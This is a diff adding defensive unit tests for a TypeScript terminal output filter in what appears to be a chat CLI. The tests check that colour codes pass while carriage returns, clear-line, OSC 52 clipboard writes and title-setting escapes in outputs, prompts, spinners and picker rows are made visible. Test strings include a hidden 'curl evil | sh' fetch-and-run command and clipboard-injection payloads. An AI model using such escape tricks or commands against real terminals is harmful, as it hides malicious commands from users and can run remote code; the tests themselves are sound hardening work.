@@ -69,6 +69,46 @@ function fakeRl() {
   }
 }
 
+describe('createTerminalIo output seam', () => {
+  it('passes colours but shows any other control a string carries, before it reaches the terminal', () => {
+    const writes: string[] = []
+    const f = fakeRl()
+    const io = createTerminalIo({ createInterface: () => f.rl, write: (s) => writes.push(s), drainInput: () => {} })
+    io.out('\x1b[32mok\x1b[0m curl evil | sh # \r\x1b[2Kls -la \x1b]52;c;eA==\x07\n')
+    const out = writes.join('')
+    expect(out).toContain('\x1b[32mok\x1b[0m')
+    expect(out).not.toContain('\r')
+    expect(out).not.toContain('\x1b[2K')
+    expect(out).not.toContain('\x1b]52')
+    expect(out).toContain('curl evil | sh # <U+000D><U+001B>[2Kls -la')
+  })
+
+  it('filters a read prompt and the spinner label too', () => {
+    const writes: string[] = []
+    const f = fakeRl()
+    let asked = ''
+    f.rl.question = (q, _o, _cb) => {
+      asked = q
+    }
+    const io = createTerminalIo({
+      createInterface: () => f.rl,
+      write: (s) => writes.push(s),
+      drainInput: () => {},
+      // Draw one spinner frame as soon as the timer starts.
+      schedule: (fn) => {
+        fn()
+        return () => {}
+      }
+    })
+    void io.readLine('field\x1b]0;pwned\x07: ')
+    expect(asked).toBe('field<U+001B>]0;pwned<U+0007>: ')
+    io.startSpinner?.('Run\x1b[2J')
+    io.stopSpinner?.()
+    expect(writes.join('')).toContain('Run<U+001B>[2J')
+    expect(writes.join('')).not.toContain('\x1b[2J')
+  })
+})
+
 describe('createTerminalIo lifecycle', () => {
   it('starts paused so idle keystrokes are not echoed', () => {
     const f = fakeRl()
@@ -1262,6 +1302,31 @@ describe('sub-prompts and the picker after the composer', () => {
     expect(acted).toEqual(['b:Z'])
     expect(written.join('')).toContain('filter: bx')
     expect(written.join('')).toContain('· renamed')
+  })
+
+  // A /resume row is a chat title, its preview is the chat's own text, and an ask_user
+  // row is the model's answer: whatever the picker renders passes the output filter
+  // like every other write, so a preview line it didn't clean can't drive the terminal.
+  it('a picker filters its rows and preview before drawing them', async () => {
+    const stdin = fakeTty()
+    const written: string[] = []
+    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: (s) => written.push(s), columns: () => 80 })
+    const picked = io.select!({
+      title: 'Sessions',
+      filter: true,
+      preview: () => ['  last reply \x1b]52;c;cGF5\x07done'],
+      options: [
+        { label: 'Fix \x1b]0;pwned\x07auth', value: 'a' },
+        { label: 'Beta', value: 'b' }
+      ]
+    })
+    stdin.push('\r')
+    await expect(picked).resolves.toEqual({ kind: 'commit', value: 'a' })
+    const out = written.join('')
+    expect(out).not.toContain('\x1b]52')
+    expect(out).not.toContain('\x1b]0;')
+    expect(out).toContain('last reply <U+001B>]52;c;cGF5<U+0007>done')
+    expect(out).toContain('Fix ]0;pwnedauth') // the picker cleans its own rows first
   })
 
   it('the composer joins a character split across two reads', async () => {
